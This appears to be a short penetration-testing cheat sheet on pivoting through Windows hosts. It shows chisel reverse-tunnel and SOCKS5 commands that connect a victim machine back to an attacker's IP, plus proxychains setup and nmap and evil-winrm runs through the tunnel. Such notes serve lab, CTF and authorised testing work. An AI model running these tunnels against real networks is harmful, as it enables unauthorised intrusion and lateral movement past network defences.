# Windows pivoting

### Chisel for Windows
https://github.com/jpillora/chisel/releases

```
Victims Box: .\chisel.exe client <attackersIP>:8011 R:1234:127.0.0.1:1234
Attackers Box: .\chisel.exe server -p 8011 --reverse
```

### ippsec demonstration Proxychains
https://www.youtube.com/watch?v=Yp4oxoQIBAM&t=5446  

```
Configuring Proxychains:

vim /etc/proxychains.conf

comment proxy_dns
uncomment quiet_mode
remove any entries within proxy list
add socks5 127.0.0.1 1080

Setting up chisel:

attackers box: 
./chisel server -p 8000 --reverse

victims box:
.\chisel.exe client <attackersIP>:8000 R:8001:127.0.0.1:1337

victims box:
.\chisel.exe server -p 1337 --socks5

attackers box:
./chisel client 127.0.0.1:8001 socks

Testing proxychains command:

proxychains nmap -sT <TargetIP> -p445 -Pn
proxychains evil-winrm.rb -i <IP> -u user -p pass
```

Standard Proxychains:  

https://medium.com/@vegardw/reverse-socks-proxy-using-chisel-the-easy-way-48a78df92f29  

```
./chisel server -p 8080 --reverse

.\chisel.exe client <IP>:8080 R:socks

Edit Proxychains config file:
/etc/proxychains.conf

Add the following:
socks5 127.0.0.1 1080
```
